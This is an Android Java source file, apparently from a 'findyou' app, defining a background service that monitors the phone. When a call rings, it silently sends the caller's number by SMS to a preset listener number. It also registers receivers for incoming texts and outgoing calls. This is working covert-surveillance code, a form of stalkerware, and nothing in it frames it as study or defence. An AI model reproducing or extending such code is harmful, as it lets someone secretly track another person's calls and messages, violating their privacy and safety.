package com.example.findyou;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;

/**
 * Created by Pengbing on 2017/4/23.
 */

public class MyService extends Service {

    private PhoneStateListener psl;     //电话状态监听
    private TelephonyManager tm;        //电话管理器

    private MessageReceiver messageReceiver;
    private IntentFilter messageIntentFt;

    private ToPhoneReceiver toPhoneReceiver;
    private IntentFilter toPhoneIntentFt;

    @Override
    public void onCreate(){
        super.onCreate();
        Log.i("MyService","onCreate");

        if(MyConstants.isIncoming){
            tm = (TelephonyManager)this.getSystemService(Context.TELEPHONY_SERVICE);
            psl = new PhoneStateListener(){
                //当注册了电话监听 且 电话状态发生改变的时候，底层会调用这个方法
                @Override
                public void onCallStateChanged(int state,String incomingNumber){
                    super.onCallStateChanged(state,incomingNumber);

                    //当电话状态为铃声响起
                    if(state == TelephonyManager.CALL_STATE_RINGING){
                        //incomingNumber 未来点着电话号码
                        String msg = incomingNumber + "call he";
                        //将msg发送给监听者
                        SmsManager sms = SmsManager.getDefault();
                        sms.sendTextMessage(MyConstants.listenerPhoneNum,null,msg,null,null);
                    }
                }
            };
        }

        if(MyConstants.isMessage){
            messageReceiver = new MessageReceiver();
            messageIntentFt = new IntentFilter();
        }
        if(MyConstants.isToPhone){
            toPhoneReceiver = new ToPhoneReceiver();
            toPhoneIntentFt = new IntentFilter();
        }
    }

    public int onStartCommand(Intent intent, int flags, int startId){
        Log.i("MyService","onStartCommand");

        if(MyConstants.isIncoming){
            tm.listen(psl, PhoneStateListener.LISTEN_CALL_STATE);
        }
        if(MyConstants.isMessage){
            messageIntentFt.addAction("android.provider.Telephony.SMS_RECEIVED");
            //注册动态广播接收者
            registerReceiver(messageReceiver,messageIntentFt);
        }
        if(MyConstants.isToPhone){
            toPhoneIntentFt.addAction("android.intent.action.NEW_OUTGOING_CALL");
            //注册动态广播接收者
            registerReceiver(toPhoneReceiver,toPhoneIntentFt);
        }
        return super.onStartCommand(intent,flags,startId);
    }

    @Override
    public void onDestroy(){
        super.onDestroy();
        Log.i("MyService","onDestroy");
        if(MyConstants.isIncoming){                 //手机状态监听销毁
            tm.listen(psl,PhoneStateListener.LISTEN_NONE);
        }
        if(MyConstants.isMessage){
            unregisterReceiver(messageReceiver);

        }
        if(MyConstants.isToPhone){
            unregisterReceiver(toPhoneReceiver);
        }

    }

    @Override
    public IBinder onBind(Intent intent){           //绑定启动

        return null;
    }

}
